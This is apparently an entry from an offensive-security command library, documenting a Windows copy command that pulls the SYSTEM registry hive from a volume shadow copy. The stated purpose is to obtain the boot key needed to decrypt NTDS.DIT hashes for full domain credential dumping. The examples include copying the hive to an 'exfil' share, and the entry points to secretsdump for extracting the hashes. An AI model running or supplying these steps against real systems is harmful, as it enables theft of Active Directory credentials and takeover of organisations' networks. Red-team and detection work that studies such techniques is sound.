---
type: command
executor: cmd
data: copy $_SHADOW_PATH\Windows\System32\config\SYSTEM $_OUTPUT_PATH\SYSTEM
output: null
created_at: '2023-04-06T03:56:03.847647+00:00'
updated_at: '2023-04-10T20:26:27.031869+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - active-directory
verified: true
validated: true
---

# copy-system-hive-from-shadow-copy

## Command

```cmd
copy $_SHADOW_PATH\Windows\System32\config\SYSTEM $_OUTPUT_PATH\SYSTEM
```

## Description

Copies the SYSTEM registry hive from the shadow copy, which contains the SysKey (boot key) required to decrypt hashes in NTDS.DIT for full credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SHADOW_PATH | Full shadow volume path (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2) | Yes |
| $_OUTPUT_PATH | Destination directory (e.g., C:\temp) | Yes |

## Examples

### Basic Usage

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Advanced Usage

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM \\_SHARE\exfil\SYSTEM
```

## Expected Output

```
1 file(s) copied.
```

File size ~10-50MB. Use with NTDS.DIT in tools like secretsdump for hash extraction. Errors similar to NTDS copy.

## Related

- [[commands/copy-ntds-dit-from-shadow-copy]]
- [[procedures/Dump-AD-Domain-Credentials-Using-VSSAdmin]]
